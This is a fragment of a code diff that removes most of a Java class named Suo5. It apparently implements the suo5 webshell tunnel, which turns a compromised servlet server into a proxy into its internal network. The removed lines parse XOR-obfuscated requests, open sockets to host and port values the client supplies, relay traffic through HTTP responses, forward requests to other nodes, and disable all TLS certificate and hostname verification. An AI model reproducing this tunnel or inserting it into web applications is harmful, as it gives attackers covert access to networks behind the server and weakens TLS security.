-        // xor key
-        byte key = data[data.length / 2];
-        dbuf.put(key);
-        for (int i = 0; i < data.length; i++) {
-            data[i] = (byte) (data[i] ^ key);
-        }
-        dbuf.put(data);
-        return dbuf.array();
-    }
-
-    private static HashMap unmarshal(InputStream in) throws Exception {
-        DataInputStream reader = new DataInputStream(in);
-        byte[] header = new byte[4 + 1]; // size and datatype
-        reader.readFully(header);
-        // read full
-        ByteBuffer bb = ByteBuffer.wrap(header);
-        int len = bb.getInt();
-        int x = bb.get();
-        if (len > 1024 * 1024 * 32) {
-            throw new IOException("invalid len");
-        }
-        byte[] bs = new byte[len];
-        reader.readFully(bs);
-        for (int i = 0; i < bs.length; i++) {
-            bs[i] = (byte) (bs[i] ^ x);
-        }
-        HashMap m = new HashMap();
-        byte[] buf;
-        for (int i = 0; i < bs.length - 1; ) {
-            short kLen = bs[i];
-            i += 1;
-            if (i + kLen >= bs.length) {
-                throw new Exception("key len error");
-            }
-            if (kLen < 0) {
-                throw new Exception("key len error");
-            }
-            buf = copyOfRange(bs, i, i + kLen);
-            String key = new String(buf);
-            i += kLen;
-
-            if (i + 4 >= bs.length) {
-                throw new Exception("value len error");
-            }
-            buf = copyOfRange(bs, i, i + 4);
-            int vLen = bytesToU32(buf);
-            i += 4;
-            if (vLen < 0) {
-                throw new Exception("value error");
-            }
-
-            if (i + vLen > bs.length) {
-                throw new Exception("value error");
-            }
-            byte[] value = copyOfRange(bs, i, i + vLen);
-            i += vLen;
-
-            m.put(key, value);
-        }
-        return m;
-    }
-
-    private static void processDataBio(Object request, Object resp, java.io.InputStream reqInputStream) throws Exception {
-        final BufferedInputStream reqReader = new BufferedInputStream(reqInputStream);
-        HashMap dataMap;
-        dataMap = unmarshal(reqReader);
-
-        byte[] action = (byte[]) dataMap.get("ac");
-        if (action.length != 1 || action[0] != 0x00) {
-            MyResponse.setStatus(resp,403);
-            return;
-        }
-        MyResponse.setBufferSize(resp,8 * 1024);
-
-        final OutputStream respOutStream = (OutputStream) MyResponse.getOutputStream(resp);
-
-        // 0x00 create socket
-        MyResponse.setHeader(resp,"X-Accel-Buffering", "no");
-
-        String host = new String((byte[]) dataMap.get("h"));
-        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
-        Socket sc;
-        try {
-            sc = new Socket();
-            sc.connect(new InetSocketAddress(host, port), 5000);
-        } catch (Exception e) {
-            respOutStream.write(marshal(newStatus((byte) 0x01)));
-            respOutStream.flush();
-            respOutStream.close();
-            return;
-        }
-
-        respOutStream.write(marshal(newStatus((byte) 0x00)));
-        respOutStream.flush();
-
-        final OutputStream scOutStream = sc.getOutputStream();
-        final InputStream scInStream = sc.getInputStream();
-
-        Thread t = null;
-        try {
-            Suo5 p = new Suo5(scInStream, respOutStream);
-            t = new Thread((Runnable) p);
-            t.start();
-            readReq(reqReader, scOutStream);
-        } catch (Exception e) {
-//                System.out.printf("pipe error, %s\n", e);
-        } finally {
-            sc.close();
-            respOutStream.close();
-            if (t != null) {
-                t.join();
-            }
-        }
-    }
-
-    private static void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
-        byte[] readBuf = new byte[1024 * 8];
-
-        while (true) {
-            int n = inputStream.read(readBuf);
-            if (n <= 0) {
-                break;
-            }
-            byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
-            if (needMarshal) {
-                dataTmp = marshal(newData(dataTmp));
-            }
-            outputStream.write(dataTmp);
-            outputStream.flush();
-        }
-    }
-
-    private static void readReq(BufferedInputStream bufInputStream, OutputStream socketOutStream) throws Exception {
-        while (true) {
-            HashMap dataMap;
-            dataMap = unmarshal(bufInputStream);
-
-            byte[] action = (byte[]) dataMap.get("ac");
-            if (action.length != 1) {
-                return;
-            }
-            if (action[0] == 0x02) {
-                socketOutStream.close();
-                return;
-            } else if (action[0] == 0x01) {
-                byte[] data = (byte[]) dataMap.get("dt");
-                if (data.length != 0) {
-                    socketOutStream.write(data);
-                    socketOutStream.flush();
-                }
-            } else if (action[0] == 0x03) {
-                continue;
-            } else {
-                return;
-            }
-        }
-    }
-
-    private static void processDataUnary(Object request, Object resp,java.io.InputStream is) throws Exception {
-        Object ctx = MyRequest.getServletContext(request);
-        BufferedInputStream reader = new BufferedInputStream(is);
-        HashMap dataMap;
-        dataMap = unmarshal(reader);
-        System.out.println(dataMap);
-        String clientId = new String((byte[]) dataMap.get("id"));
-        byte[] action = (byte[]) dataMap.get("ac");
-        if (action.length != 1) {
-            MyResponse.setStatus(resp,403);
-            return;
-        }
-
-            /*
-                ActionCreate    byte = 0x00
-                ActionData      byte = 0x01
-                ActionDelete    byte = 0x02
-                ActionHeartbeat byte = 0x03
-             */
-        byte[] redirectData = (byte[]) dataMap.get("r");
-        boolean needRedirect = redirectData != null && redirectData.length > 0;
-        String redirectUrl = "";
-        if (needRedirect) {
-            dataMap.remove("r");
-            redirectUrl = new String(redirectData);
-            needRedirect = !isLocalAddr(redirectUrl);
-        }
-        // load balance, send request with data to request url
-        // action 0x00 need to pipe, see below
-        if (needRedirect && action[0] >= 0x01 && action[0] <= 0x03) {
-            HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
-            conn.disconnect();
-            return;
-        }
-
-        MyResponse.setBufferSize(resp,8 * 1024);
-        OutputStream respOutStream = (OutputStream) MyResponse.getOutputStream(resp);
-        if (action[0] == 0x02) {
-            java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("getAttribute", String.class);
-            Object obj = getAttribute.invoke(MyRequest.getServletContext(request), clientId);
-            OutputStream scOutStream = (OutputStream) obj;
-            if (scOutStream != null) {
-                scOutStream.close();
-            }
-            return;
-        } else if (action[0] == 0x01) {
-            java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("getAttribute", String.class);
-            Object obj = getAttribute.invoke(MyRequest.getServletContext(request), clientId);
-            OutputStream scOutStream = (OutputStream) obj;
-            if (scOutStream == null) {
-                respOutStream.write(marshal(newDel()));
-                respOutStream.flush();
-                respOutStream.close();
-                return;
-            }
-            byte[] data = (byte[]) dataMap.get("dt");
-            if (data.length != 0) {
-                scOutStream.write(data);
-                scOutStream.flush();
-            }
-            respOutStream.close();
-            return;
-        } else {
-        }
-
-        if (action[0] != 0x00) {
-            return;
-        }
-        // 0x00 create new tunnel
-        MyResponse.setHeader(resp,"X-Accel-Buffering", "no");
-
-        String host = new String((byte[]) dataMap.get("h"));
-        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
-
-        InputStream readFrom;
-        Socket sc = null;
-        HttpURLConnection conn = null;
-
-        if (needRedirect) {
-            // pipe redirect stream and current response body
-            conn = redirect(request, dataMap, redirectUrl);
-            readFrom = conn.getInputStream();
-        } else {
-            // pipe socket stream and current response body
-            try {
-                sc = new Socket();
-                sc.connect(new InetSocketAddress(host, port), 5000);
-                readFrom = sc.getInputStream();
-
-                java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("setAttribute", String.class,Object.class);
-                getAttribute.invoke(MyRequest.getServletContext(request), clientId,sc.getOutputStream());
-
-                respOutStream.write(marshal(newStatus((byte) 0x00)));
-                respOutStream.flush();
-            } catch (Exception e) {
-                java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("removeAttribute", String.class);
-                getAttribute.invoke(MyRequest.getServletContext(request), clientId);
-                respOutStream.write(marshal(newStatus((byte) 0x01)));
-                respOutStream.flush();
-                respOutStream.close();
-                return;
-            }
-        }
-
-        try {
-            readSocket(readFrom, respOutStream, !needRedirect);
-        } catch (Exception e) {
-//                System.out.printf("pipe error, %s\n", e);
-//                e.printStackTrace();
-        } finally {
-            if (sc != null) {
-                sc.close();
-            }
-            if (conn != null) {
-                conn.disconnect();
-            }
-            respOutStream.close();
-            java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("removeAttribute", String.class);
-            getAttribute.invoke(MyRequest.getServletContext(request), clientId);
-        }
-    }
-
-    public void run() {
-        try {
-            readSocket(gInStream, gOutStream, true);
-        } catch (Exception e) {
-//                System.out.printf("read socket error, %s\n", e);
-//                e.printStackTrace();
-        }
-    }
-
-    static HashMap collectAddr() {
-        HashMap addrs = new HashMap();
-        try {
-            Enumeration nifs = NetworkInterface.getNetworkInterfaces();
-            while (nifs.hasMoreElements()) {
-                NetworkInterface nif = (NetworkInterface) nifs.nextElement();
-                Enumeration addresses = nif.getInetAddresses();
-                while (addresses.hasMoreElements()) {
-                    InetAddress addr = (InetAddress) addresses.nextElement();
-                    String s = addr.getHostAddress();
-                    if (s != null) {
-                        // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
-                        int ifaceIndex = s.indexOf('%');
-                        if (ifaceIndex != -1) {
-                            s = s.substring(0, ifaceIndex);
-                        }
-                        addrs.put((Object) s, (Object) Boolean.TRUE);
-                    }
-                }
-            }
-        } catch (Exception e) {
-//                System.out.printf("read socket error, %s\n", e);
-//                e.printStackTrace();
-        }
-        return addrs;
-    }
-
-    static boolean isLocalAddr(String url) throws Exception {
-        String ip = (new URL(url)).getHost();
-        return addrs.containsKey(ip);
-    }
-
-    static HttpURLConnection redirect(Object request, HashMap dataMap, String rUrl) throws Exception {
-        String method = MyRequest.getMethod(request);
-        URL u = new URL(rUrl);
-        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
-        conn.setRequestMethod(method);
-        try {
-            // conn.setConnectTimeout(3000);
-            conn.getClass().getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
-            // conn.setReadTimeout(0);
-            conn.getClass().getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
-        } catch (Exception e) {
-            // java1.4
-        }
-        conn.setDoOutput(true);
-        conn.setDoInput(true);
-
-        // ignore ssl verify
-        // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
-        if (HttpsURLConnection.class.isInstance(conn)) {
-            ((HttpsURLConnection) conn).setHostnameVerifier(new Suo5());
-            SSLContext ctx = SSLContext.getInstance("SSL");
-            ctx.init(null, new TrustManager[]{new Suo5()}, null);
-            ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
-        }
-
-        Enumeration headers = (Enumeration) MyRequest.getHeaderNames(request);
-        while (headers.hasMoreElements()) {
-            String k = (String) headers.nextElement();
-            conn.setRequestProperty(k, MyRequest.getHeader(request,k));
-        }
-
-        OutputStream rout = conn.getOutputStream();
-        rout.write(marshal(dataMap));
-        rout.flush();
-        rout.close();
-        conn.getResponseCode();
-        return conn;
-    }
-
-    public boolean verify(String hostname, SSLSession session) {
-        return true;
-    }
-
-    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
-    }
-
-    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
-    }
-
-    public X509Certificate[] getAcceptedIssuers() {
-        return new X509Certificate[0];
-    }
+//
+//            System.out.println(Arrays.toString(clazzByte));
+//        }catch (Exception e) {
+//            e.printStackTrace();
+//        }
+//    }
 }
